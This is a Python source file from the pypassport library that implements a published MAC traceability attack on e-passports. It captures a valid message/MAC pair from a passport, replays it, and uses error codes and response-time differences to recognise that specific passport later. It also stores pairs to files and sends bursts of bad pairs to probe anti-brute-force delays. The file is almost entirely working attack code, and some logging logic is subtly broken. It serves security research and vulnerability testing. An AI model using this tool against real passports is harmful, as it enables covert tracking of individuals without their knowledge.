# Copyright 2012 Antonin Beaujeant
#
# This file is part of pypassport.
#
# pypassport is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
# pypassport is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with pyPassport.
# If not, see <http://www.gnu.org/licenses/>.

import os
import time
import math

from pypassport.logger import Logger
from pypassport.iso7816 import Iso7816, Iso7816Exception 
from pypassport.doc9303.bac import BAC, BACException
from pypassport.reader import PcscReader, ReaderException
from pypassport.doc9303.mrz import MRZ
from pypassport import apdu
from pypassport.hexfunctions import hexToHexRep, binToHexRep

class MacTraceabilityException(Exception):
    def __init__(self, *params):
        Exception.__init__(self, *params)

class MacTraceability(Logger):
    """
    This class performs a MAC traceability attack discovered by Tom Chothia and Vitaliy Smirnov from the University of Birmingham.
    This attack can identify a passport based on a message/MAC APDU forged during a legitimate BAC.
    The two main methods are:
        - I{isVUlnerable}, it checks whether a passport is vulnerable to this attack or not.
        - I{exploit}, it exploit the vulnerability.
    """
    
    def __init__(self, iso7816, mrz=None):
        Logger.__init__(self, "MAC TRACEABILITY")
        self._iso7816 = iso7816
        self._mrz = mrz
        
        if type(self._iso7816) != type(Iso7816(None)):
            raise MacTraceabilityException("The sublayer iso7816 is not available")

        self._iso7816.rstConnection()

        self._bac = BAC(iso7816)
    
    def isVulnerable(self, CO=1.7):
        """Check whether a passport is vulnerable:
            - Initiate a legitimate BAC and store a pair of message/MAC
            - Reset a BAC with a random number for mutual authentication and store the answer together with the response time
            - Reset a BAC and use the pair of message/MAC from step 1 and store the answer together with the response time
        
        If answers are different, this means the the passport is vulnerable. 
        If not, the response time is compared. If the gap is wide enough, the passport might be vulnerable.
        
        Note: The French passport (and maybe others) implemented a security against brute forcing: 
        anytime the BAC fail, an incremented delay occur before responsding.
        That's the reson why we need to establish a proper BAC to reset the delay to 0
        Note 2: The default cut off set to 1.7ms is based on the paper from Tom Chotia and Vitaliy Smirnov: 
        A traceability Attack Against e-Pasport. 
        They figured out a 1.7 cut-off suit for every country they assessed without raising low rate of false-positive and false-negative
        
        @param CO: The cut off used to determine whether the response time is long enough to considerate the passport as vulnerable
        @type CO: an integer that represent the cut off in milliseconds
        
        @return: A boolean where True means that the passport seems to be vulnerable and False means doesn't 
        """
        cmd_data = self._getPair()
        self.rstBAC()
        (ans1, res_time1) = self._sendPair()
        self.rstBAC()
        (ans2, res_time2) = self._sendPair(cmd_data)
        
        vulnerable = False
        comment = "Cut-off: {} Wrong MAC: SW1:{} SW2:{} - Wrong cipher: SW1:{} SW2:{}".format((res_time2-res_time1)*1000, ans1[1], ans1[2], ans2[1], ans2[2])
        
        if ans1[0] != ans2[0] or (res_time2 - res_time1) > (CO/1000):
            self.log("Vulnerable")
            vulnerable = True
            

        
        self.log("Error message with wrong MAC: [{0}][{1}]".format(ans1[1], ans1[2]))
        self.log("Error message with correct MAC: [{0}][{1}]".format(ans2[1], ans2[2]))
        self.log("Response time with wrong MAC: {0} s".format(res_time1))
        self.log("Response time with correct MAC: {0} s".format(res_time2))
        
        return (vulnerable, comment)
    
    def demo(self, CO=1.7, validate=3):
        """Here is a little demo to show how accurate is the traceability attack.
        Please note that the French passport will most likely output a false positive because of the anti brute forcing delay.
        
        @param CO: The cut off used to determine whether the response time is long enough to considerate the passport as vulnerable
        @type CO: an integer that represent the cut off in milliseconds
        @param valisate: check 3 time before validate the passport as identified
        @type validate: An integer that represent the number of validation
        
        @return: A boolean True whenever the initial passport is on the reader
        """
        
        cmd_data = self._getPair()
        time.sleep(5)
        
        i=0
        while i<validate:
            
            ans1 = ans2 = [""]
            res_time1 = res_time2 = 0
            
            try:
                self._iso7816.rstConnection()

                try: (ans1, res_time1) = self._sendPair()
                except ReaderException: pass
                
                try: (ans2, res_time2) = self._sendPair(cmd_data)
                except ReaderException: pass
            
            except Iso7816Exception:
                pass

            if ans1[0] != ans2[0]:
                i+=1
            elif (res_time2 - res_time1) > (CO/1000):
                i+=1
        
        return True
    
    def savePair(self, path=".", filename="pair"):
        """savePair stores a message with its valid MAC in a file.
        The pair can be used later, in a futur attack, to define if the passport is the one that creates the pair (See checkFromFile()).
        If the path doesn't exist, the folders and sub-folders will be create.
        If the file exist, a number will be add automatically.
        
        @param path: The path where the file has to be create. It can be relative or absolute.
        @type path: A string (e.g. "/home/doe/" or "foo/bar")
        @param filename: The name of the file where the pair will be saved
        @type filename: A string (e.g. "belgian-pair" or "pair.data")
        
        @return: the path and the name of the file where the pair has been saved.
        """
        if not os.path.exists(path): os.makedirs(path)
        if os.path.exists(path+"/"+filename):
            i=0
            while os.path.exists(path+"/"+filename+str(i)):
                i+=1
            path = path+"/"+filename+str(i)
        else:
            path = path+"/"+filename
        
        cmd_data = self._getPair()
        
        with open(path, 'wb') as pair:
            pair.write(cmd_data)

        return path
    
    def checkFromFile(self, path="./pair", CO=1.7):
        """checkFromFile read a file that contains a pair and check if the pair has been capture from the passport .
        
        @param path: The path of the file where the pair has been saved.
        @type path: A string (e.g. "/home/doe/pair" or "foo/bar/pair.data")
        @param CO: The cut off used to determine whether the response time is long enough to considerate the passport as vulnerable
        @type CO: an integer that represent the cut off in milliseconds
        
        @return: A boolean where True means that the passport is the one who create the pair in the file.
        """
        if not os.path.exists(path): raise MacTraceabilityException("The pair file doesn't exist (path={0})".format(path))
        with open(path, 'rb') as pair:
            cmd_data = pair.read()
                    
        belongs = False
        (ans1, res_time1) = self._sendPair()
        (ans2, res_time2) = self._sendPair(cmd_data)
        
        if ans1[0] != ans2[0]:
            belongs = True

        elif (res_time2 - res_time1) > (CO/1000):
            belongs = True
        
        return belongs
        
    
    def test(self, j, per_delay=10):
        """test is a method developped for analysing the response time of password whenever a wrong command is sent
        French passport has an anti MRZ brute forcing. This method help to highlight the behaviour 
        
        @param until: Number of wrong message to send before comparing the time delay
        @type until: An integer
        @param per_delay: how result per delay you want to output
        @type per_delay: An integer
        """
            
        cmd_data = self._getPair()

        i = per_delay
        total = 0
        while i>0:
            self.rstBAC()
            k = 0
            while j>k:
                self._sendPair(cmd_data)
                k+=1
            (ans1, res_time1) = self._sendPair(cmd_data)
            (ans2, res_time2) = self._sendPair(cmd_data)
            total += math.fabs(res_time2 - res_time1)
            i-=1
        return total/per_delay
            
    
    def setMRZ(self, mrz):
        """Set the MRZ
        
        @param MRZ: MRZ used for the legitimate BAC
        @type MRZ: A string of the MRZ
        """
        self._mrz = MRZ(mrz)
        if self._mrz.checkMRZ():
            try:
                self._bac.authenticationAndEstablishmentOfSessionKeys(self._mrz)
                self._iso7816.rstConnection()
                return True
            except BACException, msg:
                raise MacTraceabilityException("Wrong MRZ")
        else:
            return False

    def reachMaxDelay(self, nb=13):
        """Send a 13 (or more) wrong pair in order to reach the longest delay
        Note: Useful only for passport with anti MRZ brute forcing security.
        """
        i=nb
        while i>0:
            self._sendPair()
            i-=1
    
    def rstBAC(self):
        """Establish a legitimate BAC with the passport then reset the connection
        """
        self.log("Establish a valid BAC")
        self.log("Reset the delay (in french passport)")
        self._iso7816.rstConnection()
        self._bac.authenticationAndEstablishmentOfSessionKeys(self._mrz)
        self._iso7816.rstConnection()
    
    def _getPair(self):
        """Get a message with a valid MAC (regarding the derived Kmac from the MRZ)
        
        @return: A valid binary message/MAC APDU
        """
        
        self.log("Get a message with a valid MAC")
        self.log("MRZ: " + self._mrz.getMrz())
        
        self._bac.derivationOfDocumentBasicAccesKeys(self._mrz)
        rnd_icc = self._iso7816.getChallenge()
        self.log("RND.ICC: " + binToHexRep(rnd_icc))
        cmd_data = self._bac.authentication(rnd_icc)
        self.log("The valid pair:" + binToHexRep(cmd_data))
        self.log("RST connection")
        self._iso7816.rstConnection()
        return cmd_data

    
    def _sendPair(self, cmd_data="\x55"*40):
        """Send a message/MAC.
        If the cmd_data is not set, it send a random pair in order to make sure the MAC check fail
        If set, a wrong message is sent together with a valid MAC in order to pass the MAC check
        
        @param cmd_data: pair to send
        @type cmd_data: a string of the raw data to send
        
        @return: The response time together with error message
        """
        self._iso7816.getChallenge()
        
        data = binToHexRep(cmd_data)
        self.log("Send a message with a wrong MAC")
        self.log("Message/MAC:" + data)
        lc = hexToHexRep(len(data)/2)
        toSend = apdu.CommandAPDU("00", "82", "00", "00", lc, data, "28")
        starttime = time.time()
        try:
            response = self._iso7816.transmit(toSend, "Wrong MAC")
        except Iso7816Exception, msg:
            response = msg
        timetaken =  time.time() - starttime
        self.log("Sent")
        self.log("Message:" + msg[0])
        self.log("SW1 1:" + str(msg[1]))
        self.log("SW2 2:" + str(msg[2]))
        self.log("Response time:" + str(timetaken))
        self.log("RST connection")
        self._iso7816.rstConnection()
        return (response, timetaken)
